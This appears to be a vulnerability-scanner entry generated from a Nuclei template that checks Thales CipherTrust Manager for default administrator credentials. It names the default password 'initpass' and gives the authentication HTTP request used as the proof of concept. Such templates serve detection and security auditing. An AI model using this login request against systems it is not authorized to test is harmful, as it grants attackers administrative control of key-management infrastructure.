# Nuclei Template: Ciphertrust - Default Login
**Template ID:** ciphertrust-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`ciphertrust-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Attackers can control the entire platform through the default password （initpass） vulnerability, and use administrator privileges to operate core functions.

## Steps to reproduce / Exploit Payload
```http
POST /api/v1/auth/tokens/  HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"username":"{{username}}","connection":"local_account","password":"{{password}}","grant_type":"password","refresh_token_revoke_unused_in":30,"cookies":true,"labels":["web-ui"]}
```

## References
- https://www.thalesdocs.com/ctp/cm/2.6/get_started/deployment/initial-password/index.html#:~:text=The%20username%20of%20the%20initial,to%20%22admin%22%20in%20lowercase.
